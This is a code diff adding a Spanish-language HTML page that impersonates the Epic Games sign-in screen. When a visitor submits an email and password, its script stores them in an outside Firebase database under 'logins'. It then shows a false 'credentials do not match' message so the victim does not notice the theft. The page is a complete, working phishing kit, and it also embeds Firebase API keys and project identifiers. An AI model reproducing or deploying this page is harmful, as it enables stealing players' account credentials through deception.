@@ -1,0 +1,158 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Iniciar sesión</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      background-color: #121212;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background-color: #1e1e1e;
+      padding: 40px;
+      border-radius: 10px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.6);
+      text-align: center;
+    }
+    .login-container img {
+      max-width: 45px;
+      margin-bottom: 0px;
+    }
+    .login-container h2 {
+      margin-bottom: 30px;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    .input-group label {
+      display: block;
+      margin-bottom: 5px;
+      color: #ccc;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 5px;
+      background-color: #2a2a2a;
+      color: #fff;
+      font-size: 16px;
+    }
+    .login-btn {
+      width: 100%;
+      padding: 12px;
+      background-color: #0074e4;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      color: white;
+      cursor: pointer;
+    }
+    .login-btn:hover {
+      background-color: #005ec0;
+    }
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      color: #888;
+    }
+    .social-buttons button {
+      width: 100%;
+      margin-bottom: 10px;
+      padding: 10px;
+      font-size: 14px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    .facebook { background-color: #3b5998; color: white; }
+    .google { background-color: #db4437; color: white; }
+    .xbox { background-color: #107C10; color: white; }
+    .signup {
+      text-align: center;
+      margin-top: 20px;
+    }
+    .signup a {
+      color: #00aaff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/31/Epic_Games_logo.svg" alt="Epic Games Logo">
+    <h2>Iniciar sesión</h2>
+    <div class="input-group">
+      <label for="email">Correo electrónico</label>
+      <input type="email" id="email">
+    </div>
+    <div class="input-group">
+      <label for="password">Contraseña</label>
+      <input type="password" id="password">
+    </div>
+    <div style="text-align: left; margin-top: -10px; margin-bottom: 20px;">
+      <a href="#" style="color: #00aaff; text-decoration: none; font-size: 14px;">¿Olvidaste tu contraseña?</a>
+    </div>
+    <button class="login-btn">Iniciar sesión</button>
+    <div class="divider">o</div>
+    <div class="social-buttons">
+      <button class="facebook">Continuar con Facebook</button>
+      <button class="google">Continuar con Google</button>
+      <button class="xbox">Continuar con Xbox Live</button>
+    </div>
+    <div class="signup">
+      ¿No tienes cuenta? <a href="#">Regístrate</a>
+    </div>
+  </div>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyDmdgKOzKwkDu4llQtI6Pxv6-sUytyZ19Q",
+      authDomain: "epic-1dd5a.firebaseapp.com",
+      databaseURL: "https://epic-1dd5a-default-rtdb.firebaseio.com/",
+      projectId: "epic-1dd5a",
+      storageBucket: "epic-1dd5a.firebasestorage.app",
+      messagingSenderId: "344159148945",
+      appId: "1:344159148945:web:320432d62fd717890b1830"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    document.querySelector('.login-btn').addEventListener('click', () => {
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value.trim();
+      if (email && password) {
+        const newLoginRef = database.ref('logins').push();
+        newLoginRef.set({
+          correo: email,
+          contraseña: password,
+          timestamp: new Date().toISOString()
+        }).then(() => {
+          alert('El correo electronico y la contrasena no coinciden');
+        }).catch((error) => {
+          console.error('Error al guardar:', error);
+        });
+      } else {
+        alert('Completa ambos campos.');
+      }
+    });
+  </script>
+</body>
+</html>
